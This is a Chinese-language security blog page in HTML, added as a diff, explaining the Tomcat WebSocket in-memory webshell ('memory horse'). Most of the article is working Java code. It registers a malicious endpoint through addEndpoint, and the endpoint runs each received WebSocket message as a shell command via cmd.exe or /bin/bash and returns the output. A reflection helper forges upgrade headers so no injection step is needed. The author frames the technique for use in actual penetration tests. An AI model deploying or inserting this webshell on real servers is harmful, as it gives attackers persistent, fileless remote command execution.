@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>tomcat websocket内存马 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "tomcat websocket\u5185\u5b58\u9a6c", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "addEndpoint \u6ce8\u5165\u5185\u5b58", url: "#addendpoint" },
+              {title: "\u6ce8\u91ca", url: "#_2" },
+              {title: "", url: "#_3" },
+              {title: "\u624b\u52a8\u5347\u7ea7-\u65e0\u9700\u6ce8\u5165", url: "#-" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
+        反序列化
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="tomcat-websocket">tomcat websocket内存马</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#addEndpoint-注入内存">addEndpoint 注入内存</a></li>
+<li><a href="#注释">注释</a></li>
+<li><a href="#"></a></li>
+<li><a href="#手动升级-无需注入">手动升级-无需注入</a></li>
+</ul>
+<h2 id="addendpoint">addEndpoint 注入内存</h2>
+<p>websocket内存马是一个比较新的内存马，它是通过addEndpoint方法被塞进内存中的。注起来也比较简单</p>
+<p>恶意类可以这样被植入到内存中</p>
+<pre><code class="language-纯文本">ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());
+ServerEndpointConfig config = ServerEndpointConfig.Builder.create(evil.class, &quot;/ws&quot;).build();
+container.addEndpoint(config);
+</code></pre>
+<p>恶意类长这样，调用onmessage方法进行恶意操作</p>
+<pre><code class="language-纯文本"> public static class C extends Endpoint implements MessageHandler.Whole&lt;String&gt; {
+        private Session session;
+        @Override
+        public void onMessage(String s) {
+            try {
+                Process process;
+                boolean bool = System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;);
+                if (bool) {
+                    process = Runtime.getRuntime().exec(new String[] { &quot;cmd.exe&quot;, &quot;/c&quot;, s });
+                } else {
+                    process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, s });
+                }
+                InputStream inputStream = process.getInputStream();
+                StringBuilder stringBuilder = new StringBuilder();
+                int i;
+                while ((i = inputStream.read()) != -1)
+                    stringBuilder.append((char)i);
+                inputStream.close();
+                process.waitFor();
+                session.getBasicRemote().sendText(stringBuilder.toString());
+            } catch (Exception exception) {
+                exception.printStackTrace();
+            }
+        }
+        @Override
+        public void onOpen(final Session session, EndpointConfig config) {
+            this.session = session;
+            session.addMessageHandler(this);
+        }
+    }
+</code></pre>
+<p>植入后的触发逻辑</p>
+<h2 id="_2">注释</h2>
+<p>也可以通过注释来添加webscoket端点，但是实际渗透中我们往往是传jsp，jsp不支持注释。
+所以这个方法了解一下即可。</p>
+<pre><code class="language-纯文本">@ServerEndpoint(value = &quot;/websocket&quot;)
+</code></pre>
+<h2 id="_3"></h2>
+<h2 id="-">手动升级-无需注入</h2>
+<pre><code class="language-纯文本">    private void SetHeader(HttpServletRequest request, String key, String value){
+        Class&lt;? extends HttpServletRequest&gt; requestClass = request.getClass();
+        try {
+            Field requestField = requestClass.getDeclaredField(&quot;request&quot;);
+            requestField.setAccessible(true);
+            Object requestObj = requestField.get(request);
+            Field coyoteRequestField = requestObj.getClass().getDeclaredField(&quot;coyoteRequest&quot;);
+            coyoteRequestField.setAccessible(true);
+            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
+            Field headersField = coyoteRequestObj.getClass().getDeclaredField(&quot;headers&quot;);
+            headersField.setAccessible(true);
+            MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj);
+            headersObj.removeHeader(key);
+            headersObj.addValue(key).setString(value);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    SetHeader(request,&quot;Connection&quot;,&quot;upgrade&quot;);
+    SetHeader(request,&quot;Sec-WebSocket-Version&quot;,&quot;13&quot;);
+    SetHeader(request,&quot;Upgrade&quot;,&quot;websocket&quot;);
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
+        反序列化
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
